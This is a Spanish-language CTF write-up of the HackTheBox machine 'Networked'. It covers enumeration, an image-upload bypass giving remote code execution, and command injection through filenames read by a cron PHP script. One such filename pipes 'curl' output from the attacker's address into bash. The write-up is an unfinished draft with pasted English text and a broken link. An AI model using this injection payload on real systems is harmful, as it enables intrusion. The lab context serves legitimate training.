---
title: "Networked"
date: 2025-05-29 16:41:34 +0200
categories: writeups HackTheBox
tags: máquina linux infoleak rce fileupload commandinjection codeanalysis
description: Writeup de la máquina Networked de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

**Networked** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**, 

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127121659.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.146`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.146 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127121900.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.10.146 -oN targeted
```

En el segundo escaneo de **Nmap** lo que más nos llamará es la versión del servicio **ssh**, pues es vulnerable a una **Username Enumeration**.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127121919.png>)
___
### Puerto 80 - HTTP (Apache)

Al acceder a la página web alojada en el puerto **80** veremos el siguiente mensaje.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127123114.png>)

Al no encontrar nada interesante pasaremos a realizar fuzzing de directorios y archivos usando **Gobuster** gracias al siguiente comando.

```bash
gobuster dir -u http://10.10.10.146 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
```

Nos llamará la atención el directorio **/backup** y el fichero **upload.php**.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127123314.png>)

Al acceder al directorio **/backup** veremos un archivo llamado **backup.tar**.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127123334.png>)

Al descomprimir el fichero **.tar** veremos que contiene los ficheros de la página web, es decir el código fuente.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127123413.png>)
#### upload.php

En el fichero **upload.php** veremos que se encarga de comprobar que que el fichero es una imagen a través de la función `check_file_type()` presnete en **lib.php** y que el tamaño del fichero no sea superior a `60000` Bytes es decir `0.06` Megabytes.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127124344.png>)

En este mismo fichero veremos que comprueba que termine en una extensión válida (`.jpg`, `.png`, `.gif`, `.jpeg`)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127124107.png>)
#### lib.php

En el fichero **lib.php** podemos ver la función `genameUpload()` la cual se encarga de devolver un array con el nombre del fichero y su extensión.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127124959.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125025.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127124423.png>)

___
## Explotación
### Upload Arbitrary File | RCE

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125119.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125125.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125319.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125125.png>)

es debido a esta función en lib.php que obtiene el mime type real

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125353.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125501.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125508.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125524.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125529.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125549.png>)

tal y como habíamos visto en upload.php sabemos que se sube en uploads


![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125709.png>)

es muy raro que esto vaya y porque pasa esto
#### ¿ Porque Funciona ?
I was very confused at this point. It turns out this is a configuration error in how the web server is deciding what to execute as code as opposed to return a static file or an image. Details are **here](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler). The standard case is that php will only process files ending in `.php`. The configuration error here means that as long as `.php` is somewhere in the name it will process as php. I’ll look into the configuration a bit more in despues en [Más allá del Root**

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125834.png>)

___
## Movimiento lateral de usuario
### Enumeración local

Tras ganar acceso a la máquina víctima realizaremos un **Tratamiento de la TTY** para operar desde una terminal más cómoda.

Tal y como se aprecia abajo, existe un usuario llamado **guly** en el que seguramente nos tengamos que convertir.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127125947.png>)

Al dirigirnos a la home de dicho usuario (**/home/guly**) veremos dos archivos inusuales.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130015.png>)

Uno de ellos es una tarea **Crontab** que se encarga de ejecutar **check_attack.php** cada 3 minutos.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130023.png>)

El archivo **check_attack.php** contiene el siguiente código.

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130157.png>)

iterate por todos los fichero que hay en $path, es decir en **/var/www/html/uploads**

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130428.png>)

si es fichero index.html continua con el sigueitne

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130547.png>)

si no es una ip válida check\[0] es false por lo que ejecutará `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`, instrucción en la cual controlamos el $value que es nombre del fichero por que lo podemos probar una COmmand Injection

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130704.png>)


### Command Injection

crearemos el fichero con touch `;ping -c 1 10.10.16.4`

realmente se está ejecuando: y auqnue se esté enviando al /dev/null el comando por detrás se ejecuta

```php
exec("nohup /bin/rm -f $path;ping -c 1 10.10.16.4 > /dev/null 2>&1 &");
```

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127130937.png>)

`;curl 10.10.16.4 |bash`

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127131230.png>)

___
## Escalada de privilegios

### Enumeración local

**Tratamiento de la TTY**

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127131322.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127132724.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127131442.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127132807.png>)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127131617.png>)
### Shell

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127131824.png>)

[Error Reportado en Seclists](https://seclists.org/fulldisclosure/2019/Apr/24)

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127132212.png>)
___
## Más allá del Root
### PHP - Misconfiguration

![](<../assets/images/posts/2025-05-29-networked/Pasted image 20250127134218.png>)
